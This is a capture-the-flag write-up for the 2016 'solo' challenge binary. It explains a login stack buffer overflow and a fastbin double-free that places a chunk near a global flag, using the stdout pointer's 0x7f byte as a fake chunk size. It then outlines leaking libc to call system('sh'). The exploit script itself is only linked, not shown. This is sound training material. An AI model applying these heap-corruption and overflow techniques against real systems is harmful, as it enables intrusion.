# 0x0 Introduction
```
┌──[ root Hacked by Hawk1n5 at CTF in ~/CTF/Xmax_ctf_2016/solo ]
└─────> file solo 
solo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a4bc7756998eb9c75ac8e3df5041a688f4bde7df, stripped
┌──[ root Hacked by Hawk1n5 at CTF in ~/CTF/Xmax_ctf_2016/solo ]
└─────> checksec solo 
[*] '/root/CTF/Xmax_ctf_2016/solo/solo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
    FORTIFY:  Enabled
```

This binary have some feature :
```
WELCOME TOOOOOO EASY SERVICE
H4CK TH15 S3RVICE PLZ!!!

1. malloc
2. free
3. list
4. login
5. exit
$ 
```

* malloc
	* ptr = malloc(size)
	* read(0, ptr, size)
* free
	* free(index)
* list
	* do nothing
* login
	* if *0x602080 != 0 
		* read(0, buf, 0x7d0)
* exit
	* quit
		
# 0x1 vulnerbility

## login buffer overflow

In login method,it read size 0x7d0 will let it bof,and overwrite ret address.

but login have a check :

```
  400770:	48 83 3d 08 19 20 00 	cmpq   $0x0,0x201908(%rip)        # 602080 <stdout+0x10>
  400777:	00 
  400778:	74 29                	je     4007a3 <__isoc99_scanf@plt+0x133>
  40077a:	be 2a 0e 40 00       	mov    $0x400e2a,%esi
  40077f:	bf 01 00 00 00       	mov    $0x1,%edi
  400784:	31 c0                	xor    %eax,%eax
  400786:	e8 c5 fe ff ff       	callq  400650 <__printf_chk@plt>
  40078b:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
  400790:	ba d0 07 00 00       	mov    $0x7d0,%edx
  400795:	31 ff                	xor    %edi,%edi
  400797:	31 c0                	xor    %eax,%eax
  400799:	e8 72 fe ff ff       	callq  400610 <read@plt>
```

0x602080 must big then 0, so we need another vul to overwrite 0x602080, and use this bof to get shell.

## fastbin corruption

In free method, it didn't check your input pointer is free or not.

So,it have double free.

And can use fastbin corruption,control malloc chunk to anywhere

* how to do
	* 1 = malloc(size) 
	* 2 = malloc(size)
	* free(1)
	* free(2)
	* free(1)
		* then fastbin will like this:
	```
	(0x70)     fastbin[5]: 0x603000 --> 0x603070 --> 0x603000 (overlap chunk with 0x603000(freed) )
	```
	* 3 = malloc(size) = 0x603000 # input aaaa
	* 4 = malloc(size) = 0x603070
	* 5 = malloc(size) = 0x603000
	* 6 = malloc(size) = 0x61616161 "aaaa"

now, we know how to use this vul,and we need to overwire 0x602080,

but malloc() have a check about fastbin,it will check malloc size and will malloc chunk size is same,

near 0x602080, there have a symbol "stdout" and it high byte is 0x7f, 

```
gdb-peda$ x/10gx 0x602060
0x602060:       0x0000000000000000      0x0000000000000000
0x602070 <stdout>:      0x00007ffff7dd72a0      0x0000000000000000
0x602080:       0x0000000000000000      0x0000000000000000
```

so we use size is 0x70-0x10(size and prev size),

in the 3rd time to malloc write 0x60206d in to heap

and the 6th time to malloc will get 0x60206d because is size(+8) is 0x70 so it can pass malloc check 

```
gdb-peda$ x/2gx 0x60206d
0x60206d:	0xfff7dd72a0000000	0x000000000000007f
```

finally, overflow and leak libc base then call system('sh')

[payload](exp.rb)
